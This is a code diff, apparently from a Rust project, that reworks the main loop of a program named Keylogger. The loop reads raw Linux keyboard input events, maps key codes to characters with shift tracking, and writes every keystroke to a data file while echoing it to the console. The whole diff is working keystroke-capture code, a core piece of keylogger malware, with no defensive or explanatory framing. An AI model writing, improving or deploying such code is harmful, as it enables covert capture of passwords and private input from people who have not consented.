@@ -43,6 +43,7 @@ impl Common for Keylogger {
             .unwrap();
 
         let mut buf: [u8; EV_SIZE] = unsafe { mem::zeroed() };  
+        let mut shift_pressed = false;
 
         loop {
             match device_file.read(&mut buf) {
@@ -52,26 +53,36 @@ impl Common for Keylogger {
                     }
 
                     let ev = unsafe { mem::transmute::<[u8; EV_SIZE], input_event>(buf) };
-                    log_keystroke(ev, &mut data_file);
+                    if ev.type_ != EV_KEY {
+                        continue
+                    }
+
+                    let code = ev.code as usize;
+
+                    if ev.value == 1 { // on keypress
+                        let key = match ev.code {
+                            LEFTSHIFT | RIGHTSHIFT => {
+                                shift_pressed = true;
+                                continue;
+                            },
+                            0..=MAX_KEYS => if shift_pressed { SHIFT_KEY_NAMES[code] } else { KEY_NAMES[code] },
+                            _ => UK
+                        };
+
+                        if data_file.write(key.as_bytes()).unwrap() == 0 { continue };
+                        println!("{}", key);
+                    } else {
+                        match ev.code {
+                            LEFTSHIFT | RIGHTSHIFT => {
+                                shift_pressed = false;
+                                continue;
+                            },
+                            _ => continue
+                        };
+                    }
                 },
                 Err(e) => panic!("Could not read: {}", e)
             }
         }
     }
-}
-
-fn log_keystroke(ev: input_event, fd: &mut File ) -> bool {
-    if ev.type_ == EV_KEY && ev.value == 0 {
-        let code = ev.code as usize;
-
-        let key = match ev.code {
-            LEFTSHIFT | RIGHTSHIFT => SHIFT_KEY_NAMES[code],
-            0..=MAX_KEYS => KEY_NAMES[code],
-            _ => UK
-        };
-
-        return fd.write(key.as_bytes()).unwrap() == 1
-    }
-
-    false
 }
